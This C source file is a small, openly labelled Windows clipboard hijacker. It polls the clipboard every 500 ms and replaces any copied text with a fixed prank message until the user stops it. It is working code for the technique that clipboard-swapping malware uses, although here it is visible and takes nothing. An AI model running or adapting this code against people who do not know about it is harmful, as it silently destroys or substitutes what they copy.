/*
 * Simple WIN32 Clipboard Hijacker
 * Polls clipboard periodically and replaces content
 * Simpler approach without clipboard viewer chain
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

const char* HIJACK_MESSAGE = "😈 Clipboard Hijacked! 😈";

BOOL SetClipboardText(const char* text) {
    if (!OpenClipboard(NULL)) {
        return FALSE;
    }
    
    EmptyClipboard();
    
    size_t len = strlen(text) + 1;
    HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, len);
    
    if (hGlobal == NULL) {
        CloseClipboard();
        return FALSE;
    }
    
    char* pGlobal = (char*)GlobalLock(hGlobal);
    strcpy(pGlobal, text);
    GlobalUnlock(hGlobal);
    
    SetClipboardData(CF_TEXT, hGlobal);
    CloseClipboard();
    
    return TRUE;
}

char* GetClipboardText() {
    if (!OpenClipboard(NULL)) {
        return NULL;
    }
    
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL) {
        CloseClipboard();
        return NULL;
    }
    
    char* pData = (char*)GlobalLock(hData);
    char* result = NULL;
    
    if (pData != NULL) {
        result = (char*)malloc(strlen(pData) + 1);
        strcpy(result, pData);
        GlobalUnlock(hData);
    }
    
    CloseClipboard();
    return result;
}

int main() {
    printf("Simple Clipboard Hijacker\n");
    printf("Press Ctrl+C to quit\n\n");
    
    int hijackCount = 0;
    
    while (1) {
        char* content = GetClipboardText();
        
        if (content != NULL) {
            if (strstr(content, "Hijacked") == NULL) {
                printf("Hijacking clipboard... (Count: %d)\n", ++hijackCount);
                SetClipboardText(HIJACK_MESSAGE);
            }
            free(content);
        }
        
        Sleep(500);  // Check every 500ms
    }
    
    return 0;
}